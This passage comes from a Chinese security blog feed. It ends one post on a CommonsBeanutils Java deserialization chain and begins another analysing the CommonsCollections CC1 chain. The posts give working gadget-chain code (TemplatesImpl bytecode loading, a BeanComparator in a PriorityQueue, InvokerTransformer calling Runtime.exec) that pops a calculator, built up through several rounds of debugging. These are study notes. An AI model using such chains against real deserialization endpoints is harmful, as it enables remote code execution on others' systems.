class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>报错信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">NoSuchMethodException: java.lang.NoSuchMethodException: Unknown property <span class="hljs-string">&#x27;outputProperties&#x27;</span> on class <span class="hljs-string">&#x27;class java.lang.Integer&#x27;</span><br></code></pre></td></tr></table></figure>

<p>跟进报错信息</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240607223017391.png" alt="image-20240607223017391"></p>
<p>对2(Interger)这个对象调用outputProperties，那肯定没有这个方法，遂报错</p>
<p>修改想法：</p>
<p>将</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(templates);<br>priorityQueue.<span class="hljs-built_in">add</span>(2);<br></code></pre></td></tr></table></figure>

<p>变为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(templates);<br>priorityQueue.<span class="hljs-built_in">add</span>(templates);<br></code></pre></td></tr></table></figure>

<p>但是又有个问题，因为add会触发compare，导致序列化的时候就走完链子</p>
<p>所以咱们先得让链子断开，add完之后，序列化之前通过反射再将链子连接起来</p>
<p>修改后：</p>
<h3 id="对象比较错误"><a href="#对象比较错误" class="headerlink" title="对象比较错误"></a>对象比较错误</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3后段代码执行部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>		<span class="hljs-comment">//PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br>        <br>        <span class="hljs-comment">//CB的部分</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>		<span class="hljs-comment">//不填beanComparator，断开链子</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br>		<br>		<span class="hljs-comment">//反射修改comparator</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">cDeclaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        cDeclaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        cDeclaredField.set(priorityQueue, beanComparator);<br><br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>错误信息 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable</code> 意味着 <code>PriorityQueue</code> 中的 <code>TemplatesImpl</code> 对象在插入时无法进行比较。<code>PriorityQueue</code> 需要所有元素实现 <code>Comparable</code> 接口或者需要一个 <code>Comparator</code> 来对元素进行比较。</p>
<p>修改想法：</p>
<p>既然templates不能比较，那就换成数字，这总可以比较吧</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(1);<br>priorityQueue.<span class="hljs-built_in">add</span>(2);<br></code></pre></td></tr></table></figure>

<p>可是又会出现刚刚不能找到outputProperties方法的问题，所以add完之后，序列化之前要将<code>priorityQueue.add(1);</code>换成<code>priorityQueue.add(templates)</code></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3后段代码执行部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//CB部分</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>		<span class="hljs-comment">//反射修改comparator和queue</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparatorField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparatorField.setAccessible(<span class="hljs-literal">true</span>);<br>        comparatorField.set(priorityQueue, beanComparator);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">queueField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queueField.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] queue = (Object[]) queueField.get(priorityQueue);<br>        queue[<span class="hljs-number">0</span>] = templates;<br><br><br><span class="hljs-comment">//        serialize(priorityQueue);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>为什么修改 <code>queue</code> 可以改变 <code>PriorityQueue</code> 的行为</p>
<p><code>PriorityQueue</code> 内部使用数组来存储元素，而这个数组的引用被保存在 <code>queue</code> 字段中。</p>
<p>通过反射，获取了 <code>PriorityQueue</code> 中 <code>queue</code> 字段的引用，并且直接修改了它，将 <code>TemplatesImpl</code> 对象添加到了队列的第一个位置。</p>
<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a></p>
<p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(三)-shiro无依赖利用链</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">CommonsBeanutils与无commons-collections的Shiro反序列化利用</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC1</title>
    <url>/2024/05/23/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC1/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>JAVA版本8u65</p>
</li>
<li><p>commons-collections 3.2.1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="Common-Collections-介绍"><a href="#Common-Collections-介绍" class="headerlink" title="Common-Collections 介绍"></a>Common-Collections 介绍</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介</a></p>
<ul>
<li><p><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</p>
</li>
<li><p><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</p>
</li>
<li><p><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键&#x2F;值映射相关的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</p>
</li>
</ul>
<h2 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h2><h3 id="寻找尾部"><a href="#寻找尾部" class="headerlink" title="寻找尾部"></a>寻找尾部</h3><p>通过<a href="https://github.com/frohoff/ysoserial">ysoserial</a>可以看到危险方法是<code>InvokerTransformer . transform()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521163436805.png" alt="image-20240521163436805"></p>
<p>我们试着用漏洞发现作者的视角来调试代码，作者首先找到了<code>Transformer</code>接口，接口有<code>transform()</code>方法。</p>
<p>有21个实现方法(包含了主角儿<code>InvokerTransformer</code>)，找到的<code>InvokerTransformer.transform()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521222016548.png" alt="image-20240521222016548"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521223049332.png" alt="image-20240521223049332"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;  <span class="hljs-comment">//接受一个对象</span><br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();  <span class="hljs-comment">//反射</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);  <br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);     <span class="hljs-comment">//方法，参数类型，参数，都可控</span><br>                <br>        &#125;<br>    <br></code></pre></td></tr></table></figure>

<p>这就可以作为我们这条链的尾部。</p>
<p>尝试用这个方法去弹计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-comment">//普通弹计算器写法</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <br>    <br>    <span class="hljs-comment">//反射写法</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    Class&lt;Runtime&gt; c = Runtime.class;<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    exec.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br>    <br>    <span class="hljs-comment">//InvokerTransformer.transform写法</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>为什么写<code> new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></p>
<p>首先，我们确认<code>InvokerTransformer.transform()</code>因为参数可控，可以调用任意方法。<code>transform()</code>需要传入的是一个对象,所以传入对象Runtime对象；</p>
<p>接下来看InvokerTransformer的构造方法，第一个参数，方法名（String类型），所以填入”exec”；</p>
<p>第二个参数，参数类型（Class数组），”exec”接受一个 <code>String</code> 类型所以填入new Class[]{String.class}；</p>
<p>第三个参数，参数值（Object数组），所以填入new Object[]{“calc”})；</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521225147161.png" alt="image-20240521225147161"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521225202458.png" alt="image-20240521225202458"></p>
<p>下一步的目标是去找调用 <code>transform()</code> 方法的不同类。</p>
<h3 id="寻找调用链"><a href="#寻找调用链" class="headerlink" title="寻找调用链"></a>寻找调用链</h3><p>按住alt+f7寻找哪些函数调用了，<code>transform()</code>方法,看到有21个调用<img src="https://image.sp4rks.xyz/2024/06/image-20240522210518321.png" alt="image-20240522210518321"></p>
<p>我们目标是找到一个不同名方法调用了<code>transform()</code>方法，相当与让调用链往前走一步，最终我们呢找到了<code>TransformdMap. checkSetValue()</code>调用了<code>transform()</code><img src="https://image.sp4rks.xyz/2024/06/image-20240522211955793.png" alt="image-20240522211955793"></p>
<p>单独把这几段代码放出来解释一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformedMap继承了AbstractInputCheckedMapDecorator 并实现了 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>   <br>        <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span><br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <br>	<span class="hljs-comment">//keyTransformer 和 valueTransformer 的类型是Transformer，这表明它们是对象，而不是基本数据类型或局部变量。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7023152376788900464L</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;  <br>    <br><br>	<span class="hljs-comment">//decorate 方法是一个静态工厂方法，接受一个Map和两个Transformer对象，返回一个经过转换的Map。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125; <br><br>	<span class="hljs-comment">// 构造函数接受一个Map和两个Transformer对象，并调用父类构造函数super(map)来初始化基类部分，同时初始化 	keyTransformer 和 valueTransformer 成员变量。</span><br>  	<span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;   <br>    <br>	<span class="hljs-comment">//checkSetValue 方法用于在设置值时对值进行转换。它通过调用 valueTransformer 的 transform 方法将传入的值转换成目标值。</span><br>	<span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;       <br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">我们看到返回了一个valueTransformer.transform(value),那valueTransformer是什么？(Ctrl+鼠标左键点击valueTransformer)到了构造函数，构造函数是一个protected,说明只能自己调用<br>    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        super(map);<br>        this.keyTransformer = keyTransformer;<br>        this.valueTransformer = valueTransformer;<br>    &#125;<br>最后看到decorate方法完成了装饰操作<br>      public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        return new TransformedMap(map, keyTransformer, valueTransformer);<br>    &#125; <br><br></code></pre></td></tr></table></figure>

<p>因为decorate是一个静态方法所以可以直接使用<code>TransformedMap.decorate</code>;</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523095834788.png" alt="image-20240523095834788"></p>
<p>接下来就找谁调用了<code>checkSetValue()</code>,发现就一个调用，<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>。是<code>TransformedMap</code>的父类，发现其实<code>AbstractInputCheckedMapDecorator.setValue()</code>是重写了Entry遍历的写法。那只要有一个类遍历Entry就可以走进<code>setValue</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240522222342135.png" alt="image-20240522222342135"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        <br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;<br>            entry.setValue(r);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以试着调试一些这段代码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523000545804.png" alt="image-20240523000545804"></p>
<p>首先进入到<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>，parent为<code>TransformedMap</code>对象。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523090042519.png" alt="image-20240523090042519"></p>
<p>然后进入到<code>TransformedMap.checkSetValue</code>;vulueTransformer为<code>InvokerTransformer</code>对象</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523000632982.png" alt="image-20240523000632982"></p>
<p>然后进入了<code>InvokerTransformer.transform</code>;调用了<code>invoke()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523092438757.png" alt="image-20240523092438757"></p>
<p>捋捋调用链</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523102559433.png" alt="image-20240523102559433"></p>
<h3 id="链首"><a href="#链首" class="headerlink" title="链首"></a>链首</h3><p>上面已经证明了我们找的利用链有效，现在再往上级找，找谁调用了<code>setValue()</code>,最终找到了<code>AnnotationInvocationHandler.readObject()</code>调用了<code>setValue()</code>。所以就可以当链首。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523105916973.png" alt="image-20240523105916973"></p>
<h2 id="TransformMap版CC1"><a href="#TransformMap版CC1" class="headerlink" title="TransformMap版CC1"></a>TransformMap版CC1</h2><p>调用链</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523204418229.png" alt="image-20240523204418229"></p>
<p>因为<code>AnnotationInvocationHandler</code>不是public方法，所以只能通过反射创建</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523104354658.png" alt="image-20240523104354658"></p>
<p>反射写法没什么好说的。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151140450.png" alt="image-20240523151140450"></p>
